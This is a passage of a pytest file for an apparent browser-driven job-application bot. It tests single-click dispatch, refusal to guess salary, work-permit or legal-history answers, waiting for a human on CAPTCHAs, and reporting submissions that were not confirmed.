    def __init__(self, *, trials=(True,), raise_after_dispatch=True, eval_raises=False):
        self.trial_results = list(trials)
        self.raise_after_dispatch, self.eval_raises = raise_after_dispatch, eval_raises
        self.trials = self.dispatches = 0

    async def click(self, **kw):
        if kw.get("trial"):
            self.trials += 1
            ok = self.trial_results.pop(0) if self.trial_results else False
            if not ok:
                raise RuntimeError("element is covered")
            return
        self.dispatches += 1
        if self.raise_after_dispatch:
            raise RuntimeError("navigated away after the click")

    async def scroll_into_view_if_needed(self, **kw):
        return None

    async def evaluate(self, js, *a):
        if "click()" in js:
            self.dispatches += 1
            if self.eval_raises:
                raise RuntimeError("detached")
        return None


async def raw_click(el):
    return await engine._Run._click(object(), el)  # type: ignore[arg-type]


async def test_click_dispatches_exactly_once_even_when_it_raises_after_dispatch():
    el = FakeEl(trials=(True,))
    with pytest.raises(engine._Dispatched):
        await raw_click(el)
    assert el.dispatches == 1
    el = FakeEl(trials=(False, True))        # covered at first, clickable after scrolling: the TRIAL is retried, not the click
    with pytest.raises(engine._Dispatched):
        await raw_click(el)
    assert el.dispatches == 1 and el.trials == 2
    el = FakeEl(trials=(False, False), raise_after_dispatch=False)   # stays covered: ONE direct activation
    await raw_click(el)
    assert el.dispatches == 1
    el = FakeEl(trials=(False, False), eval_raises=True)
    with pytest.raises(engine._Dispatched):
        await raw_click(el)
    assert el.dispatches == 1


async def test_real_click_is_activated_exactly_once(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "counter", '<button id=b type=button onclick="document.body.dataset.n=(+document.body.dataset.n||0)+1;fetch(\'/count\',{method:\'POST\',body:\'x\'})">Postuler</button>')
    plan = lambda snap: StepPlan(page_kind="job_page", actions=[act(snap, r"Postuler", "click", role="open_form")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="counter", max_steps=2)
    assert await page.evaluate("document.body.dataset.n") == "1" and len(server.posts_to("/count")) == 1


async def test_a_dispatch_that_raises_is_unconfirmed_for_a_final_click_and_failed_before_data(page, server, fast, cv_pdf, tmp_path, monkeypatch):
    async def boom(self, target):
        raise engine._Dispatched("x")
    monkeypatch.setattr(engine._Run, "_click", boom)
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit")]), tmp_path, cv_pdf, mode="submit")
    assert res.status == "failed" and res.steps[0].clicked == "" and not res.submit_clicked and "Envoi non confirmé" not in res.message  # pre-data click
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, start="form", mode="submit")
    assert res.status == "failed" and "Envoi non confirmé" in res.message and res.submit_clicked


# ------------------------------------------------------------------ 3. hard-fact concepts across modifiers and word order
@pytest.mark.parametrize("label,hard", [
    ("Current annual gross salary", True), ("Are you entitled to work in France?", True), ("Salaire annuel brut actuel", True),
    ("Your salary at present", True), ("Rémunération annuelle brute en cours", True), ("Dernier salaire perçu", True),
    ("Latest compensation package", True), ("What is your current base pay?", True), ("Êtes-vous autorisé(e) à travailler en France ?", True),
    ("Avez-vous le droit de travailler en France ?", True), ("Are you legally able to work in the EU?", True),
    ("Do you have permission to work in the UK?", True), ("Allowed to work in France", True), ("Statut d'immigration", True),
    ("Immigration status", True), ("Do you need sponsorship?", True), ("Habilité à exercer en France", True),
    ("Expected salary", False), ("Prétentions salariales", False), ("Salaire souhaité", False), ("Desired compensation", False),
    ("Salary expectations", False), ("Rémunération souhaitée", False), ("Pretentions de salaire", False),
    ("Are you able to work in a team?", False), ("Permission to contact you", False), ("Last name", False), ("Poste actuel", False),
    ("Entreprise actuelle", False), ("Current job title", False),
])
def test_hard_fact_concepts_across_modifiers(label, hard):
    from jobhunt.apply.answer_check import is_hard_fact
    assert is_hard_fact(label) is hard


async def test_plausible_cannot_override_the_hard_fact_gate_for_salary_and_work_permission_wordings(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "hardfacts", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                                   '<label for=s>Current annual gross salary *</label><input id=s name=s>'
                                   '<label for=w>Are you entitled to work in France? *</label>'
                                   '<select id=w name=w required><option value="">Choisir...</option><option value="o">Oui</option><option value="n">Non</option></select>'
                                   '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: inferred(act(s, r"Current annual", "fill", None, "40000"), "alternance"),
                       lambda s: inferred(act(s, r"entitled", "select", None, "Oui"), "étudiant"))
    v = FakeVerifier(lambda i: "plausible")
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="hardfacts", verifier=v)
    assert await page.input_value("#s") == "" and await page.input_value("#w") == ""
    assert res.status == "needs_input" and {q.label for q in res.questions} == {"Current annual gross salary", "Are you entitled to work in France?"}
    facts = extra_facts()
    plan = deduce_plan(lambda s: act(s, r"entitled", "select", "work_auth", "Oui"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="hardfacts", facts=facts, verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#w") == ""   # citing a fact: still only `supported` passes
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="hardfacts", facts=facts, verifier=FakeVerifier(lambda i: "supported"))
    assert await page.input_value("#w") == "o"


# ------------------------------------------------------------------ 4. the CV is never taken for another document
@pytest.mark.parametrize("label", ["CV / Diplôme *", "Diplôme ou CV *", "Curriculum vitae et relevé de notes *", "CV + lettre de motivation *"])
async def test_a_file_input_whose_label_also_names_another_document_goes_to_the_verifier(page, server, fast, cv_pdf, tmp_path, label):
    await serve(page, "docs", FILE_FORM.format(label=label))
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r".", "upload_cv", kind="file"),  # noqa: E731
                                                            act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="docs", verifier=None)
    assert res.status == "needs_input" and await page.evaluate("document.getElementById('d').files.length") == 0
    v = FakeVerifier(lambda i: "contradiction")
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="docs", verifier=v)
    assert [i.kind for c in v.calls for i in c] == ["upload_cv"]


# ------------------------------------------------------------------ 5. on_progress: the record before any potentially sending click
async def test_on_progress_is_awaited_before_every_sending_click_with_the_steps_so_far(page, server, fast, cv_pdf, tmp_path):
    seen = []

    async def progress(r):
        seen.append((r.status, r.submit_clicked, [f.fact for f in r.steps[-1].filled], len(server.posts), r.steps[-1].index))
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit", on_progress=progress)
    assert res.status == "submitted" and len(seen) == 1
    status, clicked, facts, posts, idx = seen[0]
    assert status == "running" and clicked and posts == 0 and idx == 2 and {"first_name", "email", "phone"} <= set(facts)


async def test_on_progress_is_awaited_before_a_post_data_navigation_click_and_a_failure_blocks_the_click(page, server, fast, cv_pdf, tmp_path):
    seen = []

    async def progress(r):
        seen.append((r.submit_clicked, len(r.steps)))
    await go(page, server, ScriptedPlanner([step1, step2(), CONFIRMED]), tmp_path, cv_pdf, start="step1", mode="submit", on_progress=progress)
    assert seen[0] == (True, 1) and len(seen) == 2

    async def boom(r):
        raise RuntimeError("db down")
    server.posts.clear()
    res = await go(page, server, ScriptedPlanner([form_plan("submit")]), tmp_path, cv_pdf, start="form", mode="submit", on_progress=boom)
    assert res.status == "blocked" and not server.posts and not res.submit_clicked and "db down" not in res.message
    seen_requests = len(server.requests)
    res = await go(page, server, ScriptedPlanner([step1, step2()]), tmp_path, cv_pdf, start="step1", mode="submit", on_progress=boom)
    assert res.status == "blocked" and not any("step2" in r for r in server.requests[seen_requests:]) and not res.submit_clicked


async def test_on_progress_never_leaks_a_secret(page, server, fast, cv_pdf, tmp_path):
    seen = []

    async def progress(r):
        seen.append(r.model_dump_json())
    plan = lambda snap: StepPlan(page_kind="account_login", actions=[act(snap, r"e-mail", "fill", "account_email"),  # noqa: E731
                                                                     act(snap, r"^Mot de passe", "fill", "account_password"),
                                                                     act(snap, r"Se connecter", "click", role="login")])
    await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="login_css", mode="submit",
             on_progress=progress, max_steps=2)
    assert all(TEST_PASSWORD not in x for x in seen)


# ------------------------------------------------------------------ 7. an unchanged form does not clear "possibly sent"
ASYNC_FORM = ('<form onsubmit="event.preventDefault();fetch(\'/apply\',{{method:\'POST\',body:\'x\'}})">'
              '<label for=a>Prénom *</label><input id=a name=first_name><label for=b>Nom *</label><input id=b name=last_name>'
              '<label for=c>E-mail *</label><input id=c name=email>{extra}<button type="submit">Suivant</button></form>')


def three_fields_then_next(snap):
    return StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),
                                               act(snap, r"E-mail", "fill", "email"), act(snap, r"Suivant", "click", role="next")])


def planner_down(snap):
    raise RuntimeError("planner down")


async def test_unchanged_form_after_an_async_nav_click_keeps_nav_pending(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "asyncnext", ASYNC_FORM.format(extra=""))
    res = await go(page, server, ScriptedPlanner([three_fields_then_next, planner_down]), tmp_path, cv_pdf, start="asyncnext", mode="submit",
                   on_nav_click=no_reasons)
    assert len(res.steps) == 2 and res.status == "failed" and res.submit_clicked


async def test_same_form_with_validation_errors_is_never_proof_that_nothing_was_sent(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "rejectednext", '<form onsubmit="event.preventDefault();document.getElementById(\'c\').setAttribute(\'aria-invalid\',\'true\')">'
                '<label for=a>Prénom *</label><input id=a name=first_name><label for=b>Nom *</label><input id=b name=last_name>'
                '<label for=c>E-mail *</label><input id=c name=email aria-describedby=e><span id=e>Adresse refusée</span>'
                '<button type="submit">Suivant</button></form>')
    res = await go(page, server, ScriptedPlanner([three_fields_then_next, planner_down]), tmp_path, cv_pdf, start="rejectednext", mode="submit",
                   on_nav_click=no_reasons)
    assert len(res.steps) == 2 and res.status == "failed" and res.submit_clicked


async def test_a_new_url_with_a_form_still_clears_nav_pending(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([step1, planner_down]), tmp_path, cv_pdf, start="step1", mode="submit", on_nav_click=no_reasons)
    assert any("step2" in s.url for s in res.steps) and res.status == "failed" and not res.submit_clicked


# ------------------------------------------------------------------ 8. captcha: wait for the human
CAPTCHA_GONE = ('<h1>Candidature</h1><form><label for=x>Prénom *</label><input id=x name=x required>'
                '<div id=cap class="g-recaptcha" data-sitekey="stub" style="width:304px;height:78px;border:1px solid #999">Je ne suis pas un robot</div>'
                '<button type="submit">Envoyer ma candidature</button></form>'
                '<script>setTimeout(()=>document.getElementById("cap").remove(), {ms})</script>')


async def test_captcha_wait_lets_the_user_solve_it(page, server, fast, cv_pdf, tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "CAPTCHA_POLL_S", 0.1)
    await serve(page, "slowcap", CAPTCHA_GONE.format(ms=800))
    planner = ScriptedPlanner([StepPlan(page_kind="closed")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="slowcap", captcha_wait_s=10)
    assert res.status == "blocked" and len(planner.calls) == 1 and not planner.calls[0]["snapshot"].has_captcha
    planner = ScriptedPlanner([StepPlan(page_kind="closed")])   # default (headless): immediate needs_human, planner never asked
    res = await go(page, server, planner, tmp_path, cv_pdf, start="slowcap")
    assert res.status == "needs_human" and not planner.calls


async def test_captcha_wait_gives_up_when_the_captcha_stays(page, server, fast, cv_pdf, tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "CAPTCHA_POLL_S", 0.1)
    await serve(page, "slowcap", CAPTCHA_GONE.format(ms=600000))
    planner = ScriptedPlanner([StepPlan(page_kind="closed")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="slowcap", captcha_wait_s=0.6)
    assert res.status == "needs_human" and not planner.calls


# ================================================================== fifth review round
# ------------------------------------------------------------------ 1. "the page holds candidate data" does not depend on a native <form> submit
POST_JS = "fetch('/apply',{method:'POST',body:'x'})"
JS_DRAFTS = {
    "request_submit": ('<form id=f method="post" action="/apply"><label for=a>E-mail</label><input id=a type=email name=email value="c@example.test">'
                       '<button type="button" onclick="document.getElementById(\'f\').requestSubmit()">Continuer</button></form>'),
    "div_form_button": ('<div><label for=a>E-mail</label><input id=a type=email name=email value="c@example.test">'
                        f'<button type="button" onclick="{POST_JS}">Continuer</button></div>'),
    "div_role_button": ('<div><label for=a>Téléphone</label><input id=a type=tel name=tel value="0600000000">'
                        f'<div role="button" onclick="{POST_JS}">Continuer</div></div>'),
    "textarea_and_link": ('<div><label for=a>Message</label><textarea id=a name=msg>Bonjour</textarea>'
                          f'<a class="btn" href="#" onclick="{POST_JS};return false">Continuer</a></div>'),
}


@pytest.mark.parametrize("name", sorted(JS_DRAFTS))
async def test_dry_run_refuses_any_click_on_a_page_that_holds_data_whatever_the_control(page, server, fast, cv_pdf, tmp_path, name):
    await serve(page, "jsdraft", JS_DRAFTS[name])
    res = await go(page, server, ScriptedPlanner([open_continuer]), tmp_path, cv_pdf, start="jsdraft", max_steps=3)
    assert res.status == "ready" and not server.posts and res.steps[-1].clicked == "" and not res.submit_clicked


@pytest.mark.parametrize("name", sorted(JS_DRAFTS))
async def test_submit_mode_gates_and_records_any_click_on_a_page_that_holds_data(page, server, fast, cv_pdf, tmp_path, name):
    await serve(page, "jsdraft", JS_DRAFTS[name])
    gates, navs, finals, progress = [], [], [], []

    async def gate():
        gates.append(len(server.posts))
        return []

    async def nav():
        navs.append(len(server.posts))

    async def final():
        finals.append(1)

    async def prog(r):
        progress.append(len(server.posts))
    res = await go(page, server, ScriptedPlanner([open_continuer]), tmp_path, cv_pdf, start="jsdraft", mode="submit", before_submit=gate,
                   on_nav_click=nav, on_submit_click=final, on_progress=prog, max_steps=3)
    assert gates == [0] and len(navs) + len(finals) == 1 and progress == [0] and len(apply_posts(server)) == 1 and res.submit_clicked

    async def refuse():
        return ["déjà postulé"]
    server.posts.clear()
    res = await go(page, server, ScriptedPlanner([open_continuer]), tmp_path, cv_pdf, start="jsdraft", mode="submit", before_submit=refuse, max_steps=3)
    assert res.status == "blocked" and not server.posts and not res.submit_clicked


@pytest.mark.parametrize("box", ['<input type=search value="mécatronique" aria-label="Filtre">', '<input role=searchbox aria-label="x" value="a">',
                                 '<input name=q value="b" aria-label="x">', '<input aria-label="Mots-clés" value="c">',
                                 '<input placeholder="Search jobs" aria-label="x" value="d">'])
async def test_search_boxes_do_not_make_a_page_a_form(page, server, fast, cv_pdf, tmp_path, box):
    await serve(page, "searchy", box + '<button type="button" onclick="document.title=\'clic\'">Voir l\'offre</button>')
    plan = lambda snap: StepPlan(page_kind="job_page", actions=[act(snap, r"Voir", "click", role="open_form")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="searchy", max_steps=3)
    assert res.steps[0].clicked.startswith("Voir"), res.message + res.steps[0].note


async def test_a_cookie_button_is_still_clicked_on_a_page_that_holds_data(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "banner", '<div id=bn><button type="button" onclick="document.getElementById(\'bn\').remove()">Tout refuser</button></div>'
                                '<input aria-label="Prénom" name=first_name value="Camille"><button type="button">Continuer</button>')
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"Tout refuser", "click", role="cookies")])  # noqa: E731
    res = await go(page, server, ScriptedPlanner([plan, StepPlan(page_kind="other")]), tmp_path, cv_pdf, start="banner", max_steps=3)
    assert res.steps[0].clicked == "Tout refuser" and await page.locator("#bn").count() == 0


# ------------------------------------------------------------------ 2. while a post-data click is unresolved, nothing else is dispatched
async def test_an_unchanged_form_is_observed_not_clicked_again(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "asyncnext", ASYNC_FORM.format(extra=""))
    planner = ScriptedPlanner([three_fields_then_next])   # would click again on every step
    res = await go(page, server, planner, tmp_path, cv_pdf, start="asyncnext", mode="submit", on_nav_click=no_reasons, max_steps=6)
    assert len(apply_posts(server)) == 1 and len(planner.calls) == 1
    assert res.status == "failed" and "Envoi non confirmé" in res.message and res.submit_clicked


VALIDATION_MARKER = ('<form onsubmit="event.preventDefault();' + POST_JS + ';var c=document.getElementById(\'c\');c.setAttribute(\'aria-invalid\',\'true\')">'
                     '<label for=a>Prénom *</label><input id=a name=first_name><label for=b>Nom *</label><input id=b name=last_name>'
                     '<label for=c>E-mail *</label><input id=c name=email aria-describedby=e><span id=e>Adresse refusée</span>'
                     '<button type="submit">Suivant</button></form>')
OWNER_MSG = "Le site signale une erreur de saisie après le clic : vérifier sur le site de l'entreprise si la candidature est partie"


async def test_a_validation_marker_after_a_post_never_reopens_clicking(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "marker", VALIDATION_MARKER)
    planner = ScriptedPlanner([three_fields_then_next])   # a repeating planner
    res = await go(page, server, planner, tmp_path, cv_pdf, start="marker", mode="submit", on_nav_click=no_reasons, max_steps=6)
    assert len(apply_posts(server)) == 1 and len(planner.calls) == 1
    assert res.status == "failed" and OWNER_MSG in res.message and res.submit_clicked
    server.posts.clear()
    res = await go(page, server, ScriptedPlanner([three_fields_then_next, planner_down]), tmp_path, cv_pdf, start="marker", mode="submit",
                   on_nav_click=no_reasons, max_steps=6)
    assert len(apply_posts(server)) == 1 and res.status == "failed" and res.submit_clicked


async def test_at_most_one_final_dispatch_per_run(page, server, fast, cv_pdf, tmp_path):
    assert engine.MAX_SUBMIT_CLICKS == 1
    finals = []

    async def final():
        finals.append(1)
    await serve(page, "finalmarker", VALIDATION_MARKER.replace("Suivant", "Envoyer ma candidature"))
    plan = lambda snap: StepPlan(page_kind="form", actions=[act(snap, r"^Prénom", "fill", "first_name"), act(snap, r"^Nom", "fill", "last_name"),  # noqa: E731
                                                            act(snap, r"E-mail", "fill", "email"), act(snap, r"Envoyer", "click", role="submit")])
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="finalmarker", mode="submit", on_submit_click=final, max_steps=6)
    assert len(finals) == 1 and len(apply_posts(server)) == 1 and res.submit_clicked and res.status == "failed"


async def test_the_observed_receipt_is_still_a_submission(page, server, fast, cv_pdf, tmp_path):
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit")
    assert res.status == "submitted" and len(apply_posts(server)) == 1


# ------------------------------------------------------------------ 3. hard facts by concept + the structural backstop
@pytest.mark.parametrize("label,hard", [
    ("What was your most recent base salary?", True), ("Do you have unrestricted rights to work in France?", True),
    ("Have you ever been convicted of a felony?", True), ("Salaire fixe annuel", True), ("Part variable", True), ("Taux horaire", True),
    ("TJM", True), ("Daily rate", True), ("Hourly rate", True), ("Package", True), ("Salaire", True), ("Base salary", True),
    ("Autorisation de travail", True), ("Êtes-vous en situation régulière ?", True), ("Do you have any conflict of interest?", True),
    ("Clause de non-concurrence", True), ("Lié à un employé de l'entreprise ?", True), ("Habilitation secret défense", True),
    ("Security clearance", True), ("Préavis", True), ("Notice period", True), ("Avez-vous déjà fait l'objet de poursuites ?", True),
    ("Parenté avec un salarié", True), ("Background check consent", True), ("Any misdemeanor or arrest?", True), ("Droit de travailler en France", True),
    ("Any disciplinary sanction (sanction disciplinaire)?", True), ("Current salary and expected salary", True),
    ("Expected salary", False), ("Salary expectations", False), ("Prétentions salariales", False), ("Salaire souhaité", False),
    ("Desired hourly rate", False), ("TJM souhaité", False), ("Téléphone fixe", False), ("Target compensation", False),
    ("Rémunération attendue", False), ("Package souhaité", False), ("Message", False), ("Montant", False), ("Combien ?", False),
])
def test_hard_fact_concepts_salary_work_rights_legal_declarations(label, hard):
    from jobhunt.apply.answer_check import is_hard_fact
    assert is_hard_fact(label) is hard


async def test_ordinary_hard_fact_wordings_never_take_a_plausible_guess(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "hard5", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                               '<label for=s>What was your most recent base salary? *</label><input id=s name=s>'
                               '<label for=w>Do you have unrestricted rights to work in France? *</label>'
                               '<select id=w name=w required><option value="">Choisir...</option><option value="o">Oui</option><option value="n">Non</option></select>'
                               '<label for=c>Have you ever been convicted of a felony? *</label>'
                               '<select id=c name=c required><option value="">Choisir...</option><option value="o">Oui</option><option value="n">Non</option></select>'
                               '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: inferred(act(s, r"most recent", "fill", None, "45000"), "alternance"),
                       lambda s: inferred(act(s, r"unrestricted", "select", None, "Oui"), "étudiant"),
                       lambda s: inferred(act(s, r"convicted", "select", None, "Non"), "jamais"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="hard5", verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#s") == "" and await page.input_value("#w") == "" and await page.input_value("#c") == ""
    assert res.status == "needs_input" and len(res.questions) == 3


@pytest.mark.parametrize("label", ["Montant", "Combien ?"])
@pytest.mark.parametrize("verdict", ["plausible", "supported"])
async def test_an_inferred_number_that_no_fact_states_is_never_typed(page, server, fast, cv_pdf, tmp_path, label, verdict):
    await serve(page, "montant", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                                 f'<label for=s>{label} *</label><input id=s name=s>'
                                 '<button type="submit">Envoyer ma candidature</button></form>')
    plan = deduce_plan(lambda s: inferred(act(s, r"Montant|Combien", "fill", None, "45000"), "alternance"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="montant", verifier=FakeVerifier(lambda i: verdict))
    assert await page.input_value("#s") == "" and res.status == "needs_input" and label.rstrip(" ?") in {q.label.rstrip(" ?") for q in res.questions}
    # a number a fact states, or a one-digit count, is fine
    facts = extra_facts()
    facts.facts.append(Fact(key="budget", label="Budget", value="environ 1800 euros net"))
    plan = deduce_plan(lambda s: inferred(act(s, r"Montant|Combien", "fill", "budget", "1800"), "budget"))
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="montant", facts=facts, verifier=FakeVerifier(lambda i: verdict))
    assert await page.input_value("#s") == "1800"
    plan = deduce_plan(lambda s: inferred(act(s, r"Montant|Combien", "fill", None, "3"), "alternances"))
    await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="montant", verifier=FakeVerifier(lambda i: "plausible"))
    assert await page.input_value("#s") == "3"


# ------------------------------------------------------------------ 4. a URL change alone proves nothing
async def test_history_push_state_without_a_form_change_keeps_nav_pending(page, server, fast, cv_pdf, tmp_path):
    html = ASYNC_FORM.format(extra="").replace("fetch(", "history.pushState({}, '', '?step=2');fetch(")
    await serve(page, "pushed", html)
    res = await go(page, server, ScriptedPlanner([three_fields_then_next, planner_down]), tmp_path, cv_pdf, start="pushed", mode="submit",
                   on_nav_click=no_reasons, max_steps=4)
    assert res.status == "failed" and res.submit_clicked and len(apply_posts(server)) == 1


# ------------------------------------------------------------------ 5. a request to confirm is no receipt
async def test_a_page_asking_to_confirm_the_submission_is_not_a_receipt(page, server, fast, cv_pdf, tmp_path):
    server.post_pages["/apply"] = "confirm_request.html"
    res = await go(page, server, ScriptedPlanner([job_plan, form_plan("submit"), CONFIRMED]), tmp_path, cv_pdf, mode="submit")
    assert len(apply_posts(server)) == 1 and res.status == "failed" and "Envoi non confirmé" in res.message and res.submit_clicked


# ------------------------------------------------------------------ 6. a solved CAPTCHA widget that stays mounted
SOLVED_CAPTCHA = ('<h1>Candidature</h1><form><label for=x>Prénom *</label><input id=x name=x required>'
                  '<div class="g-recaptcha" data-sitekey="stub" style="width:304px;height:78px;border:1px solid #999">Je ne suis pas un robot</div>'
                  '{token}<button type="submit">Envoyer ma candidature</button></form>')


async def test_solved_captcha_widget_still_mounted_lets_the_run_resume(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "solved", SOLVED_CAPTCHA.format(token='<textarea name="g-recaptcha-response" style="display:none">TOKEN</textarea>'))
    planner = ScriptedPlanner([StepPlan(page_kind="closed")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="solved", captcha_wait_s=5)
    assert res.status == "blocked" and len(planner.calls) == 1 and not planner.calls[0]["snapshot"].has_captcha
    await serve(page, "solved", SOLVED_CAPTCHA.format(token='<textarea name="g-recaptcha-response" style="display:none"></textarea>'))
    planner = ScriptedPlanner([StepPlan(page_kind="closed")])
    res = await go(page, server, planner, tmp_path, cv_pdf, start="solved")
    assert res.status == "needs_human" and not planner.calls


async def test_captcha_wait_expiry_tells_the_owner_what_to_do_and_keeps_the_sent_flag(page, server, fast, cv_pdf, tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "CAPTCHA_POLL_S", 0.1)
    await serve(page, "slowcap", CAPTCHA_GONE.format(ms=600000))
    res = await go(page, server, ScriptedPlanner([StepPlan(page_kind="closed")]), tmp_path, cv_pdf, start="slowcap", captcha_wait_s=0.5)
    assert res.status == "needs_human" and "Reprendre dans une fenêtre" in res.message and "page Envois" in res.message and "environ 1 minutes" in res.message
    assert "vérifier d'abord sur le site de l'entreprise" in res.message and not res.submit_clicked


# ------------------------------------------------------------------ tidy: another spelling of the fact value is code-backed
@pytest.mark.parametrize("label,value,ok", [
    ("Toulouse", "Toulouse", True), ("Toute la France", "Toute la France", True), ("Alternance", "Alternance", True),
    ("M.", "Monsieur", True), ("Mr", "M", True), ("Mr.", "m.", True), ("Madame", "Mme", True), ("Mrs", "Mme.", True), ("Ms", "Madame", True),
    ("Mlle", "Mademoiselle", True), ("Miss", "Mlle", True), ("Yes", "Oui", True), ("O", "yes", True), ("Y", "Oui", True), ("No", "Non", True),
    ("N", "non", True),
    ("Oui", "Oui, immédiatement", False), ("France", "Toute la France", False), ("Yes, with sponsorship", "Yes", False),
    ("Yes", "Yes, with sponsorship", False), ("France entière", "Toute la France", False), ("M.", "Madame", False), ("Mme", "Monsieur", False),
    ("Oui", "Non", False), ("Yes", "No", False), ("ab", "abc", False), ("Autorisé à travailler", "Non autorisé à travailler", False),
    ("Stage", "Alternance", False), ("", "Alternance", False), ("Oui sous conditions", "Oui", False),
])
def test_option_label_matches_fact_value(label, value, ok):
    assert engine.option_matches_fact(label, value) is ok


async def test_a_civility_option_spelled_differently_is_backed_by_code(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "civ", '<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                             '<label for=c>Civilité *</label><select id=c name=c required><option value="">Choisir...</option>'
                             '<option value="m">M.</option><option value="f">Mme</option></select>'
                             '<button type="submit">Envoyer ma candidature</button></form>')
    facts = extra_facts()
    facts.facts.append(Fact(key="civility", label="Civilité", value="Monsieur"))
    plan = deduce_plan(lambda s: act(s, r"Civilité", "select", "civility", "M."))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="civ", facts=facts, verifier=None)
    assert await page.input_value("#c") == "m" and not filled_of(res, "Civilité").inferred


# ================================================================== sixth review round
SPONSOR_FORM = ('<form method="post" action="/apply"><label for=fn>Prénom *</label><input id=fn name=first_name required>'
                '<label for=v>Do you need visa sponsorship? *</label><select id=v name=v required><option value="">Choisir...</option>'
                '<option value="y">Yes</option><option value="ys">Yes, with sponsorship</option><option value="n">No</option></select>'
                '<button type="submit">Envoyer ma candidature</button></form>')


def sponsorship_facts():
    facts = extra_facts()
    facts.facts.append(Fact(key="needs_visa_sponsorship", label="Besoin d'un visa / sponsoring", value="Yes"))
    return facts


async def test_a_qualified_option_is_never_code_backed_on_a_hard_fact_field(page, server, fast, cv_pdf, tmp_path):
    await serve(page, "sponsor", SPONSOR_FORM)
    plan = deduce_plan(lambda s: act(s, r"sponsorship", "select", "needs_visa_sponsorship", "Yes, with sponsorship"))
    # plausible never passes on a hard fact, and no verifier means nothing code-backed
    for verifier in (FakeVerifier(lambda i: "plausible"), None):
        res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="sponsor", facts=sponsorship_facts(), verifier=verifier)
        assert await page.input_value("#v") == "" and res.status == "needs_input"
    # supported: filled, but reported (the option carries a qualifier the fact does not state)
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="sponsor", facts=sponsorship_facts(), verifier=FakeVerifier(lambda i: "supported"))
    f = filled_of(res, "Do you need visa sponsorship?")
    assert await page.input_value("#v") == "ys" and f.inferred and f.basis
    # the exact option is code-backed (no verifier needed) and not inferred
    plan = deduce_plan(lambda s: act(s, r"sponsorship", "select", "needs_visa_sponsorship", "Yes"))
    res = await go(page, server, ScriptedPlanner([plan]), tmp_path, cv_pdf, start="sponsor", facts=sponsorship_facts(), verifier=None)
    assert await page.input_value("#v") == "y" and not filled_of(res, "Do you need visa sponsorship?").inferred


@pytest.mark.parametrize("label,hard", [
    ("Avez-vous un véhicule ?", True), ("Do you own a vehicle?", True), ("Disposez-vous d'une voiture ?", True), ("Do you own a car?", True),
    ("Do you have a car?", True), ("Car owner", True), ("Moyen de locomotion", True), ("Êtes-vous motorisé(e) ?", True), ("Permis B", True),
    ("Permis de conduire", True), ("Driving experience", True), ("Véhicule personnel", True),
    ("Votre carrière", False), ("Career goals", False), ("Card number", False), ("Carte de visite", False), ("Careers page", False),
    ("Scar", False),
])
def test_vehicle_questions_are_hard_facts(label, hard):
    from jobhunt.apply.answer_check import is_hard_fact
    assert is_hard_fact(label) is hard


@pytest.mark.parametrize("text,ok", [
    ("The screen should read 'Your application has been received'.", False), ("L\u2019\u00e9cran doit afficher \u00ab Votre candidature a bien \u00e9t\u00e9 envoy\u00e9e \u00bb.", False),
    ("The page will say \u2018Your application has been received\u2019", False), ("Look for `Your application has been received`", False),
    ("You should see: your application has been received", False), ("Vous devriez voir que votre candidature a bien été envoyée", False),
